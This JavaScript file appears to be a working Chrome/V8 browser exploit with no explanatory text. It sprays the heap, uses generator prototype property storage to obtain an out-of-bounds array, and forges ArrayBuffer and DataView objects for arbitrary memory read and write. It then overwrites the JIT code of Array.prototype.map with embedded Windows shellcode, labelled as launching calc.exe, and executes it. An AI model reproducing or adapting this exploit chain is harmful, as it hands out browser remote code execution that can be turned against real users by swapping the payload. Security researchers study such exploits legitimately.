function d_stub(msg){
    console.log(msg);
    readline();
}


var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);
function d2u(v) {
    f64[0] = v;
    return u32;
}
function u2d(lo, hi) {
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function scavenge() {
    for (let i = 0; i < (1024 * 1024) / 16; i++) { //allocates 0x10000 times objs;
        let a = new String('Theori');
    }
}

var packed_dbl_arr = [1, 2, 3, 4.4, 5.5, 6.6]; //length : 6
var packed_ele_arr = [0x13371337, 0, {}, 0];
var spray_arr = new Array(2*1024*1024);
var spray_idx = 0;

//function spray:
//allocate 0x10000 objects for spray_arr(incrementally)
//if spray_arr.length >= 0x200000, do nothing.

function spray() {
    if (spray_idx >= 2*1024*1024) {
        //spraying upper bound.
        return false;
    }
    for (let i = 0; i < (1024 * 1024) / 16; i++) {
        tmp = packed_dbl_arr.slice(0); //avoid shallow copy.
        spray_arr[spray_idx++] = tmp;
        tmp = packed_ele_arr.slice(0);
        tmp[1] = spray_idx;
        spray_arr[spray_idx++] = tmp;
    }
}

function trigger() {
    var keys = []; //JSArray

    for (let i = 0; i < 1022; i++) {
        keys.push('b' + i); //just build a String Array contains 'b1', 'b2', ..., 'b1021'. 1022 in total.
    }

    // Run Chrome with --no-sandbox
    // calc.exe shellcode
    var shellcode = [ 0x53525150, 0x54555756, 0xE4836658, 0x606A50F0, 0x6163685A, 0x5954636C, 0x65D42948, 0x48328B48, 0x4818768B, 0x4810768B, 0x308B48AD, 0x307E8B48, 0x8B3C5703, 0x8B28175C, 0x48201F74, 0x548BFE01, 0xB70F241F, 0x528D172C, 0x3C81AD02, 0x6E695707, 0x8BEF7545, 0x481C1F74, 0x348BFE01, 0xF70148AE, 0x48D7FF99, 0x5C68C483, 0x5B5E5F5D, 0xC358595A, ];

    spray(); //try 1.
    spray(); //align mem


    function* generator() {
    }

    for (let i = 0; i < 1022; i++) {
        generator.prototype[keys[i]]; //undefined
        generator.prototype[keys[i]] = 0x1234;
    }


    var oob = null;
    // let count = 0;
    while (oob === null) {
        // count += 1;
        if (spray() === false) {
            //spray too much already.
            return false;
        }
        
        if (generator.prototype[keys[3]] == 6) {
            generator.prototype[keys[3]] = 1000000;
            for (let i = 0; i < spray_idx; i++) {
                if (spray_arr[i].length == 1000000) {
                    // d_stub("[*]Hit at index: " + i);
                    oob = spray_arr[i];
                    break;
                }
            }
        }
    }

    var fake_map_obj = [
        u2d(0, 0),
        u2d(0, 0x1000c8),
        u2d(0, 0),
        u2d(0, 0),

        /* Fake ArrayBuffer object */
        u2d(0, 0),
        u2d(0, 0),
        u2d(0, 0),
        u2d(0, 0),
        u2d(0x43434343, 0x44444444),
        u2d(0, 0),

    ].slice(0);

    var leak_idx;
    var target_idx;
    for (let i = 0; i < 100; i++) {
        try {
            if (d2u(oob[i])[1] == 0x13371337) {
                leak_idx = i;
                break;
            }
        } catch (e) {
        }
    }

    if (leak_idx === undefined) {
        return false;
    }

    target_idx = d2u(oob[leak_idx + 1])[1];
    spray_arr[target_idx][2] = fake_map_obj;

    var fake_map_lo = d2u(oob[leak_idx + 2])[0];
    var fake_map_hi = d2u(oob[leak_idx + 2])[1];
    fake_map_lo += 0x30 - 1;

    var func_obj = Array.prototype.map;
    spray_arr[target_idx][2] = func_obj;

    var func_lo = d2u(oob[leak_idx + 2])[0];
    var func_hi = d2u(oob[leak_idx + 2])[1];

    var fake_dv_obj = [
        u2d(fake_map_lo + 1, fake_map_hi),
        u2d(0, 0),
        u2d(0, 0),
        u2d(fake_map_lo + 0x20 + 1, fake_map_hi),
        u2d(0, 0),
        u2d(0, 0x4000),
    ].slice(0);

    spray_arr[target_idx][2] = fake_dv_obj;
    var fake_dv_lo = d2u(oob[leak_idx + 2])[0]
    var fake_dv_hi = d2u(oob[leak_idx + 2])[1];
    fake_dv_lo += 0x30 - 1;

    oob[leak_idx + 3] = u2d(fake_dv_lo + 1, fake_dv_hi);
    var dv = spray_arr[target_idx][3];

    fake_map_obj[8] = u2d(func_lo + 7 * 8 - 1, func_hi);
    let jit_lo = DataView.prototype.getUint32.call(dv, 0, true) + 0x60;
    let jit_hi = DataView.prototype.getUint32.call(dv, 4, true);

    fake_map_obj[8] = u2d(jit_lo - 1, jit_hi);
    for (let k = 0; k < shellcode.length; ++k) {
        DataView.prototype.setUint32.call(dv, k * 4, shellcode[k], true);
    }

    func_obj();
    return;
}

if (trigger() === false) {
    console.log("failure.");
}
